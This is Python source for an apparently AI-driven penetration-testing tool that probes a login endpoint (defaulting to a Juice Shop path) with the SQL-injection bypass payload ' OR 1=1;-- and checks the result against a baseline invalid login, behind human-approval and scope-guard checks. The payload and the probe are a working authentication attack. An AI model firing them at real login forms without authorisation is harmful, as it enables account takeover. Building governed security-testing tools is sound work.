"""Auth Breaker tools — confirm an authentication bypass on the login endpoint.

The third offensive specialist. Its discovery signal and finding class are
distinct from the other two: a *login* surface (not a search parameter) recruits
the Auth Breaker, and a confirmed bypass is OWASP **A07 Broken Authentication**
(critical) — even though the underlying technique here is SQL injection in the
login query, the role, the endpoint, and the finding are about authentication.

``manual_auth_bypass_probe`` is a sound, honest *differential* check: it submits
a clearly-invalid credential (baseline) and a classic SQLi auth-bypass payload,
and confirms a bypass **only** when the injection yields a session token while the
baseline is rejected. If both are rejected (login hardened) or both yield a token
(the endpoint authenticates loosely for reasons not attributable to the
injection), it reports an honest not-confirmed — no fabricated finding.

Governed exactly like the SQLi/XSS tools: refused when halted, blocked behind the
code-enforced human approval gate, and authorized by the scope guard before any
request leaves.
"""
from __future__ import annotations

import httpx
from pydantic import BaseModel, Field

from governance.scope_guard import ScopeViolationError, scope_guard
from swarm.control_channel import enforce_gate
from tools._subprocess import ensure_leading_slash

# A classic SQL-injection authentication-bypass payload in the username/email field.
_BYPASS_PAYLOAD = "' OR 1=1;--"
# A credential that should never authenticate, to establish the baseline.
_BASELINE_EMAIL = "leash-nonexistent@example.test"

_GATE_DENIED = (
    "BLOCKED: human approval required before exploitation. The operator halted "
    "or did not approve this action at the Control Center gate."
)


def _has_token(resp) -> bool:
    """True iff the response carries a session/auth token (a successful login).
    Tolerant of shape: Juice Shop returns ``{"authentication": {"token": ...}}``."""
    if resp.status_code >= 400:
        return False
    try:
        data = resp.json()
    except Exception:
        data = None
    if isinstance(data, dict):
        auth = data.get("authentication")
        if isinstance(auth, dict) and auth.get("token"):
            return True
        if data.get("token"):
            return True
    return '"token"' in (resp.text or "")


def auth_tools(eng, *, gate_timeout: float = 600.0, gate_poll: float = 0.4):
    cap = lambda: eng.cap_for("leash-auth-breaker")  # noqa: E731 (terse local, mirrors sqli_tools)

    async def _gate(tool: str, endpoint: str, detail: str) -> bool:
        """Pass iff the operator has approved this endpoint; otherwise open the
        Control Center gate and block on their decision — enforced in code."""
        if eng.is_approved(endpoint):
            return True
        return await enforce_gate(
            eng, tool=tool, endpoint=endpoint, detail=detail, timeout=gate_timeout, poll=gate_poll
        )

    class ManualAuthBypassProbeInput(BaseModel):
        """Confirm a SQL-injection authentication bypass on the login endpoint by comparing an invalid credential to an injection payload (a bypass yields a token where the baseline is rejected)."""

        path: str = Field(
            default="/rest/user/login",
            description="Login endpoint path, e.g. /rest/user/login",
        )

    async def manualauthbypassprobe(args: ManualAuthBypassProbeInput) -> str:
        halted = await eng.refuse_if_halted("manual_auth_bypass_probe")
        if halted:
            return halted
        base = ensure_leading_slash(args.path)
        if not await _gate(
            "manual_auth_bypass_probe", base,
            "SQL-injection authentication-bypass attempt on the login endpoint",
        ):
            return _GATE_DENIED
        url = eng.base_url + base
        try:
            scope_guard(url, cap())
        except ScopeViolationError as e:
            await eng.log("error", tool="manual_auth_bypass_probe", path=base, blocked=str(e))
            return f"BLOCKED by scope guard: {e}"

        async with httpx.AsyncClient(timeout=10.0) as client:
            baseline = await client.post(url, json={"email": _BASELINE_EMAIL, "password": "leash-wrong-pw"})
            bypass = await client.post(url, json={"email": _BYPASS_PAYLOAD, "password": "x"})

        baseline_token = _has_token(baseline)
        bypass_token = _has_token(bypass)
        confirmed = bypass.status_code < 400 and bypass_token and not baseline_token

        await eng.log(
            "tool_result",
            tool="manual_auth_bypass_probe",
            path=base,
            baseline_status=baseline.status_code,
            bypass_status=bypass.status_code,
            baseline_token=baseline_token,
            bypass_token=bypass_token,
            confirmed=confirmed,
        )
        if confirmed:
            eng.record_finding(
                type="auth_bypass",
                endpoint=base,
                severity="critical",
                evidence=f"SQLi login bypass: {_BYPASS_PAYLOAD!r} -> HTTP {bypass.status_code} with a session token; baseline credentials rejected",
            )
            return (
                f"[VULNERABLE] {base} authentication is bypassable via SQL injection — "
                f"{_BYPASS_PAYLOAD!r} returns HTTP {bypass.status_code} with a session token while the "
                f"baseline credential is rejected. OWASP A07 (Broken Authentication), critical."
            )
        if bypass_token and baseline_token:
            return (
                f"[not confirmed] {base}: both the baseline and the injection yield a token — the "
                f"endpoint authenticates loosely, but the bypass can't be attributed to injection."
            )
        return (
            f"[not confirmed] {base}: the injection payload was rejected "
            f"(baseline HTTP {baseline.status_code}, injection HTTP {bypass.status_code}) — no auth bypass."
        )

    return [(ManualAuthBypassProbeInput, manualauthbypassprobe)]
